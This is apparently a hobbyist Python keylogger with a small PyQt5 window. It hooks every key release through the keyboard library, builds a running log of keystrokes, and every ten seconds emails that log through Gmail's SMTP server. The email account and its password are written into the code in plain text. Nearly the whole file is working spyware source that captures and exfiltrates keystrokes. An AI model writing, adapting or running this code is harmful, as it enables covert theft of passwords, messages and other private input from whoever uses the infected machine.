import keyboard, sys, smtplib
from threading import Semaphore, Timer
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QApplication, QMainWindow
SEND_REPORT_EVERY = 10
EMAIL_ADDRESS = "testingkeylogger9000@gmail.com"
EMAIL_PASSWORD = "Testing123!"

class Window1(QMainWindow): # Creates window
    def __init__(self):
        super(Window1,self).__init__()
        self.UI()

    def button_clicked(self): # Gives user a response when they click the button
        self.label.setText("This keylogger will ")
        self.update()

    def UI(self): # Basically the entire GUI
        self.setGeometry(200, 200, 300, 300) # Dimensions for the window
        self.setWindowTitle("GUI Window") # Window text
        self.label = QtWidgets.QLabel(self)
        self.label.setText("Welcome to my Keylogger. Press the button for more info.") # Text to welcome user
        self.label.move(50,50) # More dimensions
        self.b1 = QtWidgets.QPushButton(self)
        self.b1.setText("More info") # Text for the button
        self.b1.clicked.connect(self.button_clicked)

    def update(self): # Adjusting size
        self.label.adjustSize()

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # excluding character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                name = " "
            elif name == "enter":
                # whenever  ENTER is pressed, add a new line
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def sendmail(self, email, password, message):
        # connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # enter credentials to email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()

def main():
    app = QApplication(sys.argv)
    win = Window1()
    win.show()
    sys.exit(app.exec_())

main()